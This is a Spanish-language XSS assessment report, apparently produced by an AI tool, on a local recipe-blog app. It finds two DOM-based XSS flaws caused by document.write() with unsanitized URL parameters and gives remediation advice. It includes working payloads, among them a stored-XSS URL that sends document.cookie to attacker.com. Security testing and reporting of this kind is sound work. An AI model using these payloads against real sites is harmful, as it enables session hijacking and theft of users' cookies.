# Informe de Análisis de Seguridad - Cross-Site Scripting (XSS)

**Objetivo:** http://web.dev.local:8082  
**Fecha:** 2026-04-30 15:48:39  
**Analista:** GitHub Copilot CLI  
**Tipo de análisis:** Vulnerabilidades XSS (Cross-Site Scripting)

---

## Resumen Ejecutivo

Se identificaron **dos vulnerabilidades XSS** en la aplicación web "Blog de Recetas" alojada en `http://web.dev.local:8082`. Ambas son de tipo **DOM-based XSS**, ya que el código JavaScript del lado del cliente toma datos de la URL sin sanitización y los inyecta directamente en el DOM mediante `document.write()`.

---

## Descripción de la Aplicación

La aplicación es un blog de recetas con dos funcionalidades principales:
1. **Búsqueda de recetas** (parámetro GET `search`)
2. **Publicación de comentarios** (parámetros GET `name` y `comment`)

---

## Vulnerabilidades Encontradas

### VUL-01 — DOM-based XSS en parámetro `search`

| Campo        | Detalle                              |
|--------------|--------------------------------------|
| **Tipo**     | DOM-based XSS (Reflected)            |
| **Severidad**| Alta                                 |
| **Parámetro**| `search` (GET)                       |
| **Vector**   | URL: `/?search=<payload>`            |

**Descripción:**  
El parámetro `search` es leído desde la URL con `urlParams.get('search')` y concatenado directamente en llamadas a `document.write()` sin ningún tipo de sanitización o codificación:

```javascript
const searchTerm = urlParams.get('search');
// ...
document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
```

**Prueba de Concepto (PoC):**
```
http://web.dev.local:8082/?search=<script>alert('XSS_DOM_SEARCH')</script>
```

**Impacto:**  
Cualquier usuario que acceda a una URL manipulada ejecutará código JavaScript arbitrario en su navegador. Esto permite:
- Robo de cookies de sesión
- Redirección a sitios maliciosos
- Captura de credenciales (phishing)
- Defacement visual de la página

---

### VUL-02 — DOM-based XSS en parámetros `name` y `comment` (Stored via localStorage)

| Campo        | Detalle                                        |
|--------------|------------------------------------------------|
| **Tipo**     | DOM-based XSS (Stored via localStorage)        |
| **Severidad**| Alta                                           |
| **Parámetros**| `name` y `comment` (GET)                      |
| **Vector**   | URL: `/?name=<payload>&comment=<payload>`      |

**Descripción:**  
Los parámetros `name` y `comment` son leídos de la URL y almacenados en `localStorage` sin sanitización. Posteriormente, al renderizar los comentarios, se insertan directamente via `document.write()`:

```javascript
const name = urlParams.get('name');
const comment = urlParams.get('comment');

comments.push({ name: name, comment: comment, date: new Date().toLocaleString() });
localStorage.setItem('comments', JSON.stringify(comments));

// Al mostrar:
document.write('<div class="comment-author">' + c.name + '</div>');
document.write('<div>' + c.comment + '</div>');
```

**Prueba de Concepto (PoC):**
```
http://web.dev.local:8082/?name=Hacker&comment=<img src=x onerror=alert('XSS_STORED')>
```

**Impacto:**  
El payload XSS se almacena en `localStorage` y se ejecuta cada vez que el usuario visita la página, hasta que los comentarios sean limpiados. Aunque el alcance está limitado al navegador del usuario que lo creó (ya que `localStorage` es por origen/navegador), en combinación con otras técnicas (CSRF, ingeniería social) podría afectar a otros usuarios.

---

## Explotación Demostrada

### XSS Reflejado vía búsqueda

**URL de explotación:**
```
http://web.dev.local:8082/?search=<script>alert(document.cookie)</script>
```

El navegador ejecutará el script al cargar la página con dicha URL.

### XSS Almacenado vía comentario (localStorage)

**URL de explotación:**
```
http://web.dev.local:8082/?name=Test&comment=<script>document.location='http://attacker.com/?c='+document.cookie</script>
```

El payload queda almacenado en `localStorage` y se ejecuta en cada visita posterior a la página.

---

## Causa Raíz

La vulnerabilidad se origina por el uso de `document.write()` con datos sin sanitizar provenientes directamente de la URL (`URLSearchParams`). No existe ningún mecanismo de:
- Codificación HTML (HTML encoding)
- Validación de entrada
- Content Security Policy (CSP)

---

## Recomendaciones

1. **Sanitizar la entrada de usuario** antes de insertarla en el DOM. Usar funciones de escape HTML como:
   ```javascript
   function escapeHtml(text) {
       const div = document.createElement('div');
       div.appendChild(document.createTextNode(text));
       return div.innerHTML;
   }
   ```

2. **Evitar `document.write()`** con datos dinámicos. Usar `textContent` o `createElement` con `appendChild` en su lugar:
   ```javascript
   const p = document.createElement('p');
   p.textContent = 'Resultados para: ' + searchTerm;
   ```

3. **Implementar Content Security Policy (CSP)** mediante cabeceras HTTP:
   ```
   Content-Security-Policy: default-src 'self'; script-src 'self'
   ```

4. **Validar y sanitizar los datos antes de almacenarlos** en `localStorage`.

5. **No usar parámetros GET** para enviar datos sensibles como comentarios; preferir POST con tokens CSRF.

---

## Conclusión

La aplicación presenta dos vulnerabilidades DOM-based XSS de severidad alta. La causa principal es la ausencia de sanitización de datos de entrada antes de su uso en `document.write()`. Se recomienda aplicar las correcciones descritas con carácter urgente.

---

*Informe generado automáticamente por análisis de seguridad web.*
